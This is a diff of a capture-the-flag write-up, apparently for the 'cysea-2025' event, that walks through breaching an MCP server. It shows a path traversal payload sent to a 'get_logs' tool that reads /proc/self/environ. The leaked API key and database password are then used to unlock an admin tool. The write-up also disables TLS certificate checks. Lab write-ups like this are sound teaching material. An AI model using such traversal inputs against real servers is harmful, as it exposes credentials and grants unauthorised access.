@@ -86,6 +86,7 @@ dot@stuff:~$ export NODE_TLS_REJECT_UNAUTHORIZED=0
 dot@stuff:~$ npx @modelcontextprotocol/inspector
 ```
 This will launch the MCP Inspector in your default web browser where we can enter the MCP url `https://mcp.tallyroom.freedonia.vote/mcp` and connect to the server.
+
 ![mcp-inspector.png](/writeups/events/cysea-2025/images/mcp-inspector.png)
 From here, you'll find that most of the tools need authorisation to use, which we don't have. The tools that don't require authentication are **hello_world** and **get_logs**. The **hello_world** function just echos back whatever name you enter in a `Hello, user!` message. In the **get_logs** function, we can see that it also accepts a date to try and get the logs for, though we only seem to be able to get logs for `2025-07-29`. Entering any other value than a valid date tells us we've entered an invalid format, but what if we enter a date and then something else, for example a path.
 ```
@@ -111,5 +112,6 @@ Input: 2025-07-29/../../../proc/self/environ
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=783f5137a61f DB_HOST=db DB_PORT=5432 DB_USER=mockuser DB_PASSWORD=mockpassword DB_NAME=mockdb MCP_API_KEY=xbvlkiclzvaygblbznnyduvfqoqzygdo HOME=/root 
 ```
 We can then use this key in the *Authentication* section of MCP Inspector. We need to change the header name to `X-Api-Key`.
+
 ![mcp-inspector.png](/writeups/events/cysea-2025/images/mcp-auth.png)
 Hit the reconnect button at the bottom and you should now be able to use the `get_admin_data` tool, along with everything else.
